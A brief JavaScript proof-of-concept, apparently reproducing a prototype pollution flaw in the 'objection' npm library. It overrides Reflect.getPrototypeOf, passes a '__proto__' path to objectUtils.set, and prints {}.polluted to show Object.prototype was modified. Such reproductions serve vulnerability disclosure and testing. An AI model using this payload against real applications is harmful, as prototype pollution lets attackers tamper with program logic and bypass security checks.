Reflect.getPrototypeOf = () => false;
const objectUtils = require('objection/lib/utils/objectUtils');
console.log({}.polluted);
let obj = {};
objectUtils.set(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);